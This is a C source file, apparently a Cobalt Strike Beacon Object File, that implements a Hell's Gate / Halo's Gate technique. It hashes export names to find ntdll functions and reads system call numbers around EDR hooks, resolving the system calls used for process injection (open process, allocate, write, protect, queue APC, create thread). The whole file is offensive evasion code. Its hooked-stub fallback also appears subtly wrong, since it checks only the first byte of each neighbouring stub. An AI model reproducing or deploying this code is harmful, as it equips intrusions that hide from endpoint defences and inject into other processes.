#include <windows.h>
#include <stdio.h>
#include "syscalls.h"
#include "beacon.h"

WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);

// Global SSNs
DWORD ssnAllocateVirtualMemory = 0;
DWORD ssnWriteVirtualMemory = 0;
DWORD ssnProtectVirtualMemory = 0;
DWORD ssnQueueApcThread = 0;
DWORD ssnResumeThread = 0;
DWORD ssnOpenProcess = 0;
DWORD ssnCreateThreadEx = 0;

// Jenkins One-at-a-time hashing (same as standard implementation often used)
DWORD HashStringByName(const char* String)
{
	DWORD Hash = 0;
	char Char = 0;

	if (!String) return 0;

	while ((Char = *String++))
	{
		Hash += Char;
		Hash += (Hash << 10);
		Hash ^= (Hash >> 6);
	}

	Hash += (Hash << 3);
	Hash ^= (Hash >> 11);
	Hash += (Hash << 15);

	return Hash;
}

DWORD GetSyscallNumber(DWORD functionHash)
{
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return 0;

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + pDosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)hNtdll + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD pNames = (PDWORD)((DWORD_PTR)hNtdll + pExportDir->AddressOfNames);
	PDWORD pFunctions = (PDWORD)((DWORD_PTR)hNtdll + pExportDir->AddressOfFunctions);
	PWORD pOrdinals = (PWORD)((DWORD_PTR)hNtdll + pExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pExportDir->NumberOfNames; i++)
	{
		char* szName = (char*)((DWORD_PTR)hNtdll + pNames[i]);
		if (HashStringByName(szName) == functionHash)
		{
			void* pFunc = (void*)((DWORD_PTR)hNtdll + pFunctions[pOrdinals[i]]);

            // --- Halo's Gate Logic ---
            // Check for hooks (JMP/CALL/INT3 usually)
            // Valid syscall stub starts with:
            // x64: 4c 8b d1 (mov r10, rcx); b8 ... (mov eax, SSN)
            // x86: b8 ... (mov eax, SSN)

            BYTE* pByte = (BYTE*)pFunc;
            DWORD dwSsn = 0;

            // Search for the SSN signature in the first 32 bytes (enough to find it or verify hook)
            // Ideally we check neighbors if hooked.
            
            // Limit search
            for (int idx = 0; idx < 32; idx++) {
                // Check if it's a MOV EAX, imm32 (0xB8)
                if (pByte[idx] == 0xB8) {
                    dwSsn = *(DWORD*)(pByte + idx + 1);
                    return dwSsn;
                }
                
                // If we hit a return (C3/C2), stop
                if (pByte[idx] == 0xC3 || pByte[idx] == 0xC2) break;
            }

            // If we are here, we are hooked or weird.
            // Check neighbors (up and down)
            // This is a simplified "Hell's Gate / Halo's Gate" implementation
            // We search explicitly for 'mov eax, [ssn]' in neighbors.
             
            for (int idx = 1; idx < 500; idx++) {
                // Check Down
                BYTE* pNeighbor = (BYTE*)pFunc + idx * 32; 
                if (*pNeighbor == 0xB8) { // mov eax, imm32
                     DWORD neighborSsn = *(DWORD*)(pNeighbor + 1);
                     return neighborSsn - idx; // Adjust back
                }

                 // Check Up
                pNeighbor = (BYTE*)pFunc - idx * 32; 
                if (*pNeighbor == 0xB8) { // mov eax, imm32
                     DWORD neighborSsn = *(DWORD*)(pNeighbor + 1);
                     return neighborSsn + idx; // Adjust forward
                }
            }
            
            return 0; // Failed
		}
	}
    BeaconPrintf(CALLBACK_ERROR, "GetSyscallNumber: Function hash 0x%x not found", functionHash);
	return 0;
}

void InitSyscalls() {
    ssnAllocateVirtualMemory = GetSyscallNumber(HASH_NtAllocateVirtualMemory);
    ssnWriteVirtualMemory    = GetSyscallNumber(HASH_NtWriteVirtualMemory);
    ssnProtectVirtualMemory  = GetSyscallNumber(HASH_NtProtectVirtualMemory);
    ssnQueueApcThread        = GetSyscallNumber(HASH_NtQueueApcThread);
    ssnResumeThread          = GetSyscallNumber(HASH_NtResumeThread);
    ssnOpenProcess           = GetSyscallNumber(HASH_NtOpenProcess);
    ssnCreateThreadEx        = GetSyscallNumber(HASH_NtCreateThreadEx);

    // BeaconPrintf(CALLBACK_OUTPUT, "SSNs Resolved: Alloc=%d, Write=%d, Protect=%d, QueueAPC=%d, Resume=%d, OpenProc=%d",
    //     ssnAllocateVirtualMemory, ssnWriteVirtualMemory, ssnProtectVirtualMemory, ssnQueueApcThread, ssnResumeThread, ssnOpenProcess);
}
